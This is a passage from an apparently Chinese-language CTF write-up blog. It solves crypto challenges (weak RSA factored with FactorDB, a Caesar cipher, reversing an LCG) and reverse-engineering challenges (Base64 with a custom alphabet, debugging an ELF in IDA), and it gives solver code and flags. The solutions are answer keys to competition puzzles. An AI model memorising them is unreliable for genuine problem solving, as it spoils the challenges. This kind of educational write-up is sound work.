<span class="line"><span class="__s_6">MMI(</span><span class="__s_7">23</span><span class="__s_6">, </span><span class="__s_7">99</span><span class="__s_6">) </span><span class="__s_4"># 56</span></span>
<span class="line"><span class="__s_6">MMI(</span><span class="__s_7">18</span><span class="__s_6">, </span><span class="__s_7">24</span><span class="__s_6">) </span><span class="__s_4"># -1</span></span></code></pre><code class="language">python</code></figure> <p>开始看题：</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_c">n = 18166111488983638423176654225038910650374178404043258136863317940757240374883045318227630220114908148002528619687208976201483203446705228237820608531034600157346418730110800833894198105113069673034318791074080878803821797374439187892933762426303490171060652425319592687318992422979831460606780689490127157122450326817694644127955168509718422226505201308410281564018832558025316135527711604948983206569045881358071837726506411561445950018434181828539749068924458242255898899889941894373420604283541696070823346969159662074221543706652525690955057870664198106495869582165707721782854117610672456879034154898769471938117</span></span>
<span class="line"><span class="__s_c">e = 65537</span></span>
<span class="line"><span class="__s_c">c = 16557540364154395713558646669072741937615342260542036031952182998548657011824978776677484944354752850867643908247704032511389420321541306432748843707416654616686046776804432102455821985542337552330254302403535524234293479604198963438410959320502344078024576646316377856554837978984863667052517437922967926155676374386985386995490935331458679889799199387332376735566839929210890931308968597230699243910342515468179185950859704753759493976488271753912140439374347388198468842216991965867366259721821413872154269673724400345270897275549939948544776957761650034569256088810092045614520316608497052245790834163200510667772</span></span></code></pre><code class="language">plaintext</code></figure> <p>把 n 丢进 <a href="http://factordb.com/index.php?query=18166111488983638423176654225038910650374178404043258136863317940757240374883045318227630220114908148002528619687208976201483203446705228237820608531034600157346418730110800833894198105113069673034318791074080878803821797374439187892933762426303490171060652425319592687318992422979831460606780689490127157122450326817694644127955168509718422226505201308410281564018832558025316135527711604948983206569045881358071837726506411561445950018434181828539749068924458242255898899889941894373420604283541696070823346969159662074221543706652525690955057870664198106495869582165707721782854117610672456879034154898769471938117" rel="noopener" target="_blank">FactorDB</a> 可以分解出 p 和 q，然后就可以得到 m。</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_c">p = 130456283857645025762691023898845608928710362686294851221450093824533197549806631148867242691844441160576320773904432512838379590127986113818416101086695539425149571612979342889778360825402727498529748702035429662584726706609716114370652011043194792995908818094170934656989995629482678233000685983090325365549</span></span>
<span class="line"><span class="__s_c">q = 139250566947059823453625463016686669261826444361819002282335838853816828667839799789393680821194880353192071200076880361361848345889074292932450446910930443112614763933390287115641256150843558712707320218852675477962227409197464100372762134803009018827495653979157431219931338408129724157546988493768646375033</span></span>
<span class="line"><span class="__s_c">m = 4079298574924100380882798141080777519551699955439474094729924030825463150621200292859549484308473511195982027523392939998962139796530757717099548565227012907221461316960947880602936490993085237650824412891417747519</span></span></code></pre><code class="language">plaintext</code></figure> <p>把 m 转换为字符串（这其实是在造轮子了）：</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_6">hex_m = </span><span class="__s_9">hex</span><span class="__s_6">(m)[</span><span class="__s_7">2</span><span class="__s_6">:] </span><span class="__s_4"># 去掉开头的0x</span></span>
<span class="line"><span class="__s_6">decoded = </span><span class="__s_2">''</span></span>
<span class="line"><span class="__s_5">for</span><span class="__s_6"> i </span><span class="__s_5">in</span><span class="__s_9"> range</span><span class="__s_6">(</span><span class="__s_7">0</span><span class="__s_6">, </span><span class="__s_9">len</span><span class="__s_6">(hex_m), </span><span class="__s_7">2</span><span class="__s_6">):</span></span>
<span class="line"><span class="__s_6">    decoded += </span><span class="__s_9">chr</span><span class="__s_6">(</span><span class="__s_d">int</span><span class="__s_6">(hex_m[i:i+</span><span class="__s_7">2</span><span class="__s_6">], </span><span class="__s_7">16</span><span class="__s_6">))</span></span></code></pre><code class="language">python</code></figure> <p>得到的字符串是 <code>0x1337 ^ (-1) mod 0x18a39cb09e40671788a6b9221371e3f5455bbde2aff984e491c85f4f3ad309613 = ?</code>，所以还需要继续进行计算。</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_6">calc = MMI(</span><span class="__s_8">0x</span><span class="__s_7">1337</span><span class="__s_6">, </span><span class="__s_8">0x</span><span class="__s_7">18a39cb09e40671788a6b9221371e3f5455bbde2aff984e491c85f4f3ad309613</span><span class="__s_6">)</span></span>
<span class="line"><span class="__s_6">hex_calc = </span><span class="__s_9">hex</span><span class="__s_6">(calc)[</span><span class="__s_7">2</span><span class="__s_6">:]</span></span>
<span class="line"><span class="__s_6">decoded = </span><span class="__s_2">''</span></span>
<span class="line"><span class="__s_5">for</span><span class="__s_6"> i </span><span class="__s_5">in</span><span class="__s_9"> range</span><span class="__s_6">(</span><span class="__s_7">0</span><span class="__s_6">, </span><span class="__s_9">len</span><span class="__s_6">(hex_calc), </span><span class="__s_7">2</span><span class="__s_6">):</span></span>
<span class="line"><span class="__s_6">    decoded += </span><span class="__s_9">chr</span><span class="__s_6">(</span><span class="__s_d">int</span><span class="__s_6">(hex_calc[i:i+</span><span class="__s_7">2</span><span class="__s_6">], </span><span class="__s_7">16</span><span class="__s_6">))</span></span></code></pre><code class="language">python</code></figure> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(62.3691%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/446edb2531f434d95ed8b52455966cee/eHokZ3dR.jpg" data-src-avif="https://p.sda1.dev/12/17193702ed83f8435a66228558418583/xOKwoSBv.jpg" data-src-webp="https://p.sda1.dev/12/1ae421724b7bf912d1e480a42bd2e636/TQXDvmXa.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRmIAAABXRUJQVlA4IFYAAAAQBACdASogABQAPrVKnkoiiOwCADgFolnAMzQIeBqA8N/NGAs/rIDDwAD9U/bUMmd4RGePkRjDWBCNVBQRjJEVliwBvL6k9rOIdpKGa4qDQCegGzgAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/446edb2531f434d95ed8b52455966cee/eHokZ3dR.jpg"> </noscript> </figure> <p><code>flag&#123;456_easy_rsa_challenge_657&#125;</code></p> <h2 id="My-kingdom"><a class="headerlink" href="#My-kingdom" title="My kingdom"></a>My kingdom</h2><p>还是 Hex 转 ASCII，得到文本：</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_c">K ecog, K ucy, K eqpswgtgf.</span></span>
<span class="line"><span class="__s_c">Eqyctfu fkg ocp{ vkogu dghqtg vjgkt fgcvju,vjg xcnkcpv pgxgt vcuvg qh fgcvj dwv qpeg.</span></span>
<span class="line"><span class="__s_c">Uckf d{ Lwnkwu Ecguct, Tqocp Ngcfgt</span></span>
<span class="line"><span class="__s_c">Lwuv nkmg yjcv Ecguct uckf, {qw eqpswgtgf, {qw fgugtxg kv.</span></span>
<span class="line"><span class="__s_c">hnci{e2o5_ucy_Lq3p_63f_E2psw5tg_evh!}</span></span></code></pre><code class="language">plaintext</code></figure> <p>最后一行很像是 flag，经过测试是 +2 的凯撒密码，用 -2 把它复原。</p> <p><del>因为解密工具抹平了大小写，还无视了数字，结果搞出了一大堆提交失败的记录⊂彡☆))д&#96;)</del></p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_c">I came, I saw, I conquered.</span></span>
<span class="line"><span class="__s_c">Cowards die man{ times before their deaths,the valiant never taste of death but once.</span></span>
<span class="line"><span class="__s_c">Said b{ Julius Caesar, Roman Leader</span></span>
<span class="line"><span class="__s_c">Just like what Caesar said, {ou conquered, {ou deserve it.</span></span>
<span class="line"><span class="__s_c">flag{c0m3_saw_Jo1n_41d_C0nqu3re_ctf!}</span></span></code></pre><code class="language">plaintext</code></figure> <p><code>flag&#123;c0m3_saw_Jo1n_41d_C0nqu3re_ctf!&#125;</code></p> <h2 id="lincoin"><a class="headerlink" href="#lincoin" title="lincoin"></a>lincoin</h2><figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_5">from</span><span class="__s_6"> Crypto.Util.number </span><span class="__s_5">import</span><span class="__s_6"> bytes_to_long</span></span>
<span class="line"><span class="__s_5">from</span><span class="__s_6"> FLAG </span><span class="__s_5">import</span><span class="__s_6"> flag</span></span>
<span class="line"></span>
<span class="line"><span class="__s_8">class</span><span class="__s_e"> LCG</span><span class="__s_6">:</span></span>
<span class="line"><span class="__s_6">    a = </span><span class="__s_8">0x</span><span class="__s_7">db626d86f5dc6cf4ec8c4ca4f4b9dab3</span></span>
<span class="line"><span class="__s_6">    b = </span><span class="__s_8">0x</span><span class="__s_7">b2dab99e8973e463ab58a4403d35675f</span></span>
<span class="line"><span class="__s_6">    n = </span><span class="__s_8">0x</span><span class="__s_7">d5aef35973977bd35331490990b6b54b80d44bdb621f861848f4377c54cf6649</span></span>
<span class="line"></span>
<span class="line"><span class="__s_8">    def</span><span class="__s_9"> __init__</span><span class="__s_6">(</span><span class="__s_b">self</span><span class="__s_6">,</span><span class="__s_b"> init_seed</span><span class="__s_6">):</span></span>
<span class="line"><span class="__s_5">        assert</span><span class="__s_6"> init_seed &#x3C; </span><span class="__s_f">self</span><span class="__s_6">.n</span></span>
<span class="line"><span class="__s_f">        self</span><span class="__s_6">.state = init_seed</span></span>
<span class="line"></span>
<span class="line"><span class="__s_8">    def</span><span class="__s_0"> rand</span><span class="__s_6">(</span><span class="__s_b">self</span><span class="__s_6">):</span></span>
<span class="line"><span class="__s_f">        self</span><span class="__s_6">.state = (</span><span class="__s_f">self</span><span class="__s_6">.a * </span><span class="__s_f">self</span><span class="__s_6">.state + </span><span class="__s_f">self</span><span class="__s_6">.b) % </span><span class="__s_f">self</span><span class="__s_6">.n</span></span>
<span class="line"><span class="__s_5">        return</span><span class="__s_f"> self</span><span class="__s_6">.state</span></span>
<span class="line"></span>
<span class="line"><span class="__s_8">    def</span><span class="__s_9"> __str__</span><span class="__s_6">(</span><span class="__s_b">self</span><span class="__s_6">):</span></span>
<span class="line"><span class="__s_5">        return</span><span class="__s_d"> str</span><span class="__s_6">(</span><span class="__s_f">self</span><span class="__s_6">.rand())</span></span>
<span class="line"></span>
<span class="line"><span class="__s_6">seed = bytes_to_long(flag)</span></span>
<span class="line"><span class="__s_6">lcg = LCG(seed)</span></span>
<span class="line"></span>
<span class="line"><span class="__s_6">times = </span><span class="__s_7">2</span><span class="__s_6"> ** </span><span class="__s_7">30</span></span>
<span class="line"><span class="__s_5">while</span><span class="__s_6"> times > </span><span class="__s_7">0</span><span class="__s_6">:</span></span>
<span class="line"><span class="__s_6">    lcg.rand()</span></span>
<span class="line"><span class="__s_6">    times -= </span><span class="__s_7">1</span></span>
<span class="line"></span>
<span class="line"><span class="__s_9">print</span><span class="__s_6">(lcg) </span><span class="__s_4"># 0xaf08e8ece96f637d3719fa1c4f0a9f88b3d330615108dd36f430c159308395b2</span></span></code></pre><code class="language">python</code></figure> <p>本体是个<a href="https://zh.wikipedia.org/zh-hans/%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99%E6%96%B9%E6%B3%95" rel="noopener" target="_blank">线性同余随机数产生器（LCG）</a>，把 flag 转为 Hex 然后设为种子，生成了 <mjx-container class="MathJax" jax="SVG"><svg width="2.919ex" height="1.887ex" style="vertical-align:0" viewBox="0 -833.9 1290.1 833.9"><g fill="currentColor" stroke="currentColor" stroke-width="0"><use transform="scale(1 -1)" href="#__m_0"/><g transform="matrix(.707 0 0 -.707 533 -363)"><use href="#__m_1"/><use transform="translate(500)" href="#__m_2"/></g></g></svg></mjx-container> 次随机数。</p> <p>LCG 的原理是：设定参数 a、b、n 以及种子 <mjx-container class="MathJax" jax="SVG"><svg width="2.861ex" height="1.92ex" style="vertical-align:-.375ex" viewBox="0 -683 1264.6 848.6"><g fill="currentColor" stroke="currentColor" stroke-width="0"><use transform="scale(1 -1)" href="#__m_3"/><use transform="matrix(.707 0 0 -.707 861 150)" href="#__m_2"/></g></svg></mjx-container> ，之后的每个随机数按照公式 <mjx-container class="MathJax" display="true" jax="SVG"><svg width="27.451ex" height="2.262ex" style="vertical-align:-.566ex" viewBox="0 -750 12133.2 1000"><g fill="currentColor" stroke="currentColor" stroke-width="0"><use transform="scale(1 -1)" href="#__m_3"/><use transform="matrix(.707 0 0 -.707 861 150)" href="#__m_4"/><use transform="matrix(1 0 0 -1 1613 0)" href="#__m_5"/><use transform="matrix(1 0 0 -1 2668.8 0)" href="#__m_6"/><use transform="matrix(1 0 0 -1 3057.8 0)" href="#__m_7"/><use transform="matrix(1 0 0 -1 3809 0)" href="#__m_8"/><use transform="matrix(1 0 0 -1 4809.3 0)" href="#__m_3"/><use transform="matrix(.707 0 0 -.707 5670.3 150)" href="#__m_4"/><use transform="matrix(.707 0 0 -.707 6094.5 150)" href="#__m_9"/><use transform="matrix(.707 0 0 -.707 6644.546 150)" href="#__m_a"/><use transform="matrix(1 0 0 -1 7270.4 0)" href="#__m_b"/><use transform="matrix(1 0 0 -1 8270.7 0)" href="#__m_c"/><use transform="matrix(1 0 0 -1 8699.7 0)" href="#__m_d"/><g transform="matrix(1 0 0 -1 9366.4 0)"><use href="#__m_e"/><use transform="translate(833)" href="#__m_f"/><use transform="translate(1333)" href="#__m_g"/></g><use transform="matrix(1 0 0 -1 11533.2 0)" href="#__m_4"/></g></svg></mjx-container> 递推生成。</p> <p><a href="https://stackoverflow.com/questions/2911432/reversible-pseudo-random-sequence-generator" rel="noopener" target="_blank">Stack Overflow</a> 上面有人写出了“反向 LCG”的算法（当然也可以自己反推），从当前随机数 <mjx-container class="MathJax" jax="SVG"><svg width="3.021ex" height="1.902ex" style="vertical-align:-.357ex" viewBox="0 -683 1335.3 840.8"><g fill="currentColor" stroke="currentColor" stroke-width="0"><use transform="scale(1 -1)" href="#__m_3"/><use transform="matrix(.707 0 0 -.707 861 150)" href="#__m_4"/></g></svg></mjx-container> 反推 LCG 生成的上一个随机数 <mjx-container class="MathJax" jax="SVG"><svg width="5.065ex" height="2.016ex" style="vertical-align:-.471ex" viewBox="0 -683 2238.9 891"><g fill="currentColor" stroke="currentColor" stroke-width="0"><use transform="scale(1 -1)" href="#__m_3"/><use transform="matrix(.707 0 0 -.707 861 150)" href="#__m_4"/><use transform="matrix(.707 0 0 -.707 1285.2 150)" href="#__m_9"/><use transform="matrix(.707 0 0 -.707 1835.246 150)" href="#__m_a"/></g></svg></mjx-container> 的公式是 <mjx-container class="MathJax" display="true" jax="SVG"><svg width="29.683ex" height="2.565ex" style="vertical-align:-.566ex" viewBox="0 -883.9 13119.9 1133.9"><g fill="currentColor" stroke="currentColor" stroke-width="0"><use transform="scale(1 -1)" href="#__m_3"/><use transform="matrix(.707 0 0 -.707 861 150)" href="#__m_4"/><use transform="matrix(.707 0 0 -.707 1285.2 150)" href="#__m_9"/><use transform="matrix(.707 0 0 -.707 1835.246 150)" href="#__m_a"/><use transform="matrix(1 0 0 -1 2516.7 0)" href="#__m_5"/><use transform="matrix(1 0 0 -1 3572.5 0)" href="#__m_7"/><use transform="matrix(.707 0 0 -.707 4134.5 -413)" href="#__m_9"/><use transform="matrix(.707 0 0 -.707 4684.546 -413)" href="#__m_a"/><use transform="matrix(1 0 0 -1 5310.4 0)" href="#__m_8"/><use transform="matrix(1 0 0 -1 6310.6 0)" href="#__m_6"/><use transform="matrix(1 0 0 -1 6699.6 0)" href="#__m_3"/><use transform="matrix(.707 0 0 -.707 7560.6 150)" href="#__m_4"/><use transform="matrix(1 0 0 -1 8257.1 0)" href="#__m_9"/><use transform="matrix(1 0 0 -1 9257.3 0)" href="#__m_c"/><use transform="matrix(1 0 0 -1 9686.3 0)" href="#__m_d"/><g transform="matrix(1 0 0 -1 10353.1 0)"><use href="#__m_e"/><use transform="translate(833)" href="#__m_f"/><use transform="translate(1333)" href="#__m_g"/></g><use transform="matrix(1 0 0 -1 12519.9 0)" href="#__m_4"/></g></svg></mjx-container> 其中 <mjx-container class="MathJax" jax="SVG"><svg width="3.429ex" height="1.909ex" style="vertical-align:-.023ex" viewBox="0 -833.9 1515.7 843.9"><g fill="currentColor" stroke="currentColor" stroke-width="0"><use transform="scale(1 -1)" href="#__m_7"/><use transform="matrix(.707 0 0 -.707 562 -363)" href="#__m_9"/><use transform="matrix(.707 0 0 -.707 1112.046 -363)" href="#__m_a"/></g></svg></mjx-container> 是 a 的模 n 除法逆元（继续用 <code>MMI</code> 函数计算）。</p> <p>写代码求解，因为循环次数太多，运行需要很长的时间，所以按了回车之后，可以去阳台上看看风景，<del>或者和妹子出去散个步什么的</del>（你怎么可能会有女朋友？）</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_8">def</span><span class="__s_0"> reverse_LCG</span><span class="__s_6">(</span><span class="__s_b">rnd</span><span class="__s_6">):</span></span>
<span class="line"><span class="__s_4">    # a = 0xdb626d86f5dc6cf4ec8c4ca4f4b9dab3</span></span>
<span class="line"><span class="__s_6">    b = </span><span class="__s_8">0x</span><span class="__s_7">b2dab99e8973e463ab58a4403d35675f</span></span>
<span class="line"><span class="__s_6">    n = </span><span class="__s_8">0x</span><span class="__s_7">d5aef35973977bd35331490990b6b54b80d44bdb621f861848f4377c54cf6649</span></span>
<span class="line"><span class="__s_6">    a_inv = </span><span class="__s_7">57217878573518668316807000375554927755910762980319730425669837644426658111070</span><span class="__s_4"> # MMI(a, n)</span></span>
<span class="line"><span class="__s_5">    return</span><span class="__s_6"> (a_inv * (rnd - b)) % n</span></span>
<span class="line"></span>
<span class="line"><span class="__s_6">rnd = </span><span class="__s_8">0x</span><span class="__s_7">af08e8ece96f637d3719fa1c4f0a9f88b3d330615108dd36f430c159308395b2</span></span>
<span class="line"><span class="__s_5">for</span><span class="__s_6"> i </span><span class="__s_5">in</span><span class="__s_9"> range</span><span class="__s_6">(</span><span class="__s_7">2</span><span class="__s_6"> ** </span><span class="__s_7">30</span><span class="__s_6"> + </span><span class="__s_7">1</span><span class="__s_6">):</span></span>
<span class="line"><span class="__s_4">    # 进度条（大误）</span></span>
<span class="line"><span class="__s_5">    if</span><span class="__s_6"> i % </span><span class="__s_7">100000</span><span class="__s_6"> == </span><span class="__s_7">0</span><span class="__s_6">:</span></span>
<span class="line"><span class="__s_9">        print</span><span class="__s_6">(</span><span class="__s_2">'</span><span class="__s_a">\r</span><span class="__s_2">'</span><span class="__s_6"> + </span><span class="__s_d">str</span><span class="__s_6">(i), </span><span class="__s_b">end</span><span class="__s_6">=</span><span class="__s_2">''</span><span class="__s_6">)</span></span>
<span class="line"><span class="__s_6">    rnd = reverse_LCG(rnd)</span></span>
<span class="line"></span>
<span class="line"><span class="__s_9">print</span><span class="__s_6">()</span></span>
<span class="line"><span class="__s_9">print</span><span class="__s_6">(rnd)</span></span></code></pre><code class="language">python</code></figure> <p>过了很久很久很久很久……终于算出来了，种子是 <code>180966415225526098453856893299872427450627808844390491008662352366530869117</code>，继续转字符串，得到 <code>flag&#123;541_LCG_iS_A_baD_pRng_167&#125;</code>。</p> <p>（发现自己做的时候忘了截图，重新算一遍又要好长时间，就不截图了吧）</p> <p>（其实 <code>from Crypto.Util.number import bytes_to_long</code> 是可以直接整数转换为字节的）</p> <h1 id="Reverse"><a class="headerlink" href="#Reverse" title="Reverse"></a>Reverse</h1><h2 id="easyRE"><a class="headerlink" href="#easyRE" title="easyRE"></a>easyRE</h2> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/4b133ac53a9d8c4ede245a0e7049438f/hqc2nOWG.png" data-src-webp="https://p.sda1.dev/12/fa4dfa3574400bf72688a9286ad5013f/7pneIk1o.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRmgAAABXRUJQVlA4IFwAAAAQBACdASogABIAPqlGnEmzEVDYBgBgCoSzgGc6EO+DCWHl5FE4qXd+AAD+9QHzQ83ugy3kZRtybOck/duzYQjEuMdvTPge/ZrtZdVygSOBaaid5f3ht1CjDAAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/4b133ac53a9d8c4ede245a0e7049438f/hqc2nOWG.png"> </noscript> </figure> <p>IDA 一开，有个字符串 <code>ZmxhZ3tSM19XMXRoX2I0c2U2NF8xc19zMW1wbGVfMG4zfQ==</code>，估计是 Base64，实际上真的是 Base64，解码后得到 <code>flag&#123;R3_W1th_b4se64_1s_s1mple_0n3&#125;</code>。</p> <h2 id="easyELF"><a class="headerlink" href="#easyELF" title="easyELF"></a>easyELF</h2> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/f188dbabbcef16f40888b6d31312197e/mDiLlEZD.png" data-src-webp="https://p.sda1.dev/12/450eff54392201326decf5b8d33b25ff/eOvKtw9f.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRmQAAABXRUJQVlA4IFgAAAAQBACdASogABIAPrVKoEqkmJCUBqhwC0S0gGZoCI4+l0NgpS1H+jKIYAD+9P/M0ob8dWFO/W/b+eNgAmoxDZvTtGIUwGTLQsK9+D2mMegoc9YhRNzyhiAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/f188dbabbcef16f40888b6d31312197e/mDiLlEZD.png"> </noscript> </figure> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/8ac90b3a4ef76a69e7d822d51042be35/tT-1lWjY.png" data-src-webp="https://p.sda1.dev/12/7a193f85afb30b85e188aaca2dfeb41c/eHv74Kip.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRnIAAABXRUJQVlA4IGYAAABQBACdASogABIAPrVGnUoyqCQhsBgMAOAWiWUAzuwQ72xsMr1SDPM0hVIAAP71Pjs5XjcH7zsyoy8Fxz6ZbtxvaSj4fUCKovXyHSqHkQaOS1fyBefjCv0+IFkgA/mwu9hRgZORZAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/8ac90b3a4ef76a69e7d822d51042be35/tT-1lWjY.png"> </noscript> </figure> <p>用 IDA 打开本体，发现 <code>sub_4006CB</code> 比较可疑，再点进去，发现 <code>v7</code> 也比较可疑……</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/a19928863f63a887f1f4dddf66850ae3/aLJHuHYo.png" data-src-webp="https://p.sda1.dev/12/fb3d50ff9e6593b9be1497790d54681f/mqNepm1o.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRnoAAABXRUJQVlA4IG4AAABQBACdASogABIAPq1Im0mulFHYBgBgCsSyAF+cEOO+/c+m24yo0RWnmKEAAP7zqQCbRjvF2rE97fWG2b2pAEe7CoNOG4dAIdBlF/r+SlhGIeRT6LPaoDXKffpE4aH983wJYDT7tuUxK/ysZbgAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/a19928863f63a887f1f4dddf66850ae3/aLJHuHYo.png"> </noscript> </figure> <p>下断点动态调试，flag 保存在了 <code>v7</code>：<code>flag&#123;Here_are_yo_To_be_interested_and_excited&#125;</code></p> <p><del>你们搞的这个比赛啊，excited！</del></p> <h2 id="reverseMe"><a class="headerlink" href="#reverseMe" title="reverseMe"></a>reverseMe</h2><p>输入一个字符串，这个字符串被进行了一堆操作后将会和 <code>+wXp+xDkldnFdFNFdxnzdFWpGx2m</code>（应该就是操作后的 flag）比对。这个应该不是 Base64 了……吗？</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/467f2921470c040663c659515b182e0d/Xjs4NTvA.png" data-src-webp="https://p.sda1.dev/12/76ad66dca1da87bc713bc0fe1c3d86ca/9Jw_i_kh.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRmQAAABXRUJQVlA4IFgAAADwAwCdASogABIAPrVEn0oksqMYDAYAcAtEs4AAFzowmpeld0jogxEAAP7zps4ldS5vdShX8dNLYZ8nJbLAAsOk4s1DgRySvdUZcieJlIMpLYQzaPu8GYAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/467f2921470c040663c659515b182e0d/Xjs4NTvA.png"> </noscript> </figure> <p>对比一下现有的 C 语言计算 Base64 的代码可以说是完全一致，所以这个操作还是在算 Base64。</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/36019a5d45c5463e500209ee10a5345f/Xd6ePOII.png" data-src-webp="https://p.sda1.dev/12/cc9f52d6cc885f7db90f344f78287d6c/rj_f4XF1.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRmIAAABXRUJQVlA4IFYAAADwAwCdASogABIAPrVKoEqkkYoDVDgFolnAM38ERyNncHHmDsMMy5eAAP7z7UuWUA7U0DkKTFRTAPUC2QsM9hO2COKnCLKn4K0sblZSnlDAtzu4uAAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/36019a5d45c5463e500209ee10a5345f/Xd6ePOII.png"> </noscript> </figure> <p>继续翻变量，可以发现字符表不是 <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code> 而是 <code>R9Ly6NoJvsIPnWhETYtHe4Sdl+MbGujaZpk102wKCr7/ODg5zXAFqQfxBicV3m8U</code>，所以继续写代码先转换成出原版 Base64 再拿去解码：</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_6">ori = </span><span class="__s_2">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span>
<span class="line"><span class="__s_6">mod = </span><span class="__s_2">'R9Ly6NoJvsIPnWhETYtHe4Sdl+MbGujaZpk102wKCr7/ODg5zXAFqQfxBicV3m8U'</span></span>
<span class="line"><span class="__s_6">flag_mod = </span><span class="__s_2">'+wXp+xDkldnFdFNFdxnzdFWpGx2m'</span></span>
<span class="line"><span class="__s_6">flag_ori = </span><span class="__s_2">''</span></span>
<span class="line"><span class="__s_5">for</span><span class="__s_6"> i </span><span class="__s_5">in</span><span class="__s_6"> flag_mod:</span></span>
<span class="line"><span class="__s_6">    flag_ori += ori[mod.index(i)]</span></span>
<span class="line"><span class="__s_9">print</span><span class="__s_6">(flag_ori)</span></span></code></pre><code class="language">python</code></figure> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(62.3691%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/275410b53e409c2a3ebcdb63c44e8390/BiMxR7mD.jpg" data-src-avif="https://p.sda1.dev/12/e9084bbdf911878e0a95a5b1bf072adc/i7vMB_Ye.jpg" data-src-webp="https://p.sda1.dev/12/fe5eb350fa85ebd15e7fe42b2744be81/_XWokDLs.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRmgAAABXRUJQVlA4IFwAAADwAwCdASogABQAPrVKnUoqiOwCADgFollAMoAIeF8c4vWHA6LK7ev4AP1T9tQyZ3kZH7EGYzTDn7Y7JdV5ES5H2f2nvShLzzAIKYBRYXkgCFuvOwR4D5lpGwAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/275410b53e409c2a3ebcdb63c44e8390/BiMxR7mD.jpg"> </noscript> </figure> <p>转换为原版 Base64 是 <code>ZmxhZ3tiYXMzXzFzX3MwXzNhc3l9</code>，解码后得到 <code>flag&#123;bas3_1s_s0_3asy&#125;</code>。</p> <p>顺便看了一下源代码。经过实验，大量出现的 <code>(unsigned __int64)(0xAAAAAAAAAAAAAAABLL * (unsigned __int128)var &gt;&gt; 64) &gt;&gt; 1</code> 相当于求 <code>var</code> 整除 <code>3</code>，具体原理不得而知，<del>大概是参考了平方根倒数速算法</del>。</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(62.3691%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/bcb5d43ae7ec59b541101b54153a58ff/98EMHiE-.jpg" data-src-avif="https://p.sda1.dev/12/f0bcd1c1a8cd65a6cc5d88d5095ce020/mByHkTzI.jpg" data-src-webp="https://p.sda1.dev/12/3e14274688c263c74888080a3d7e0c3b/B-b7V3SI.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRlIAAABXRUJQVlA4IEYAAADQAwCdASogABQAPrVKnUo0iOwCADgFolpAABb7YYQS7rNbjpdt4AAA8qd+irySUFYTI6sICAW7QY44uIeR7oCHA267yxAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" 